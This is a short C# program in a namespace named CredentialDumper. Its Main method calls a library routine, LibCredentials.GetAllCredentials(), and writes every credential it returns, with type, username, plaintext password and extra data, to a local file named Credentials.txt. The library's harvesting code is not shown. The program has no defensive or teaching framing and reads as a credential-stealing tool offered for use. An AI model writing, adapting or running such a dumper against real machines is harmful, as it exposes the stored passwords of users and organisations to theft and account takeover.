#region

using System.IO;

#endregion

namespace CredentialDumper
{
    internal static class Program
    {
        private const string FileName = "Credentials.txt";

        private static void Main(string[] argv)
        {
            var fstream = new FileStream(FileName, FileMode.Create, FileAccess.Write);
            var streamWriter = new StreamWriter(fstream);

            foreach (var credential in LibCredentials.LibCredentials.GetAllCredentials())
            {
                streamWriter.WriteLine("==================================================");
                streamWriter.WriteLine("Type: " + credential.Type);
                streamWriter.WriteLine("Username: " + credential.Username);
                streamWriter.WriteLine("Password: " + credential.Password);
                streamWriter.WriteLine("Extra: " + credential.Extra);
            }

            streamWriter.Close();
            fstream.Close();
        }
    }
}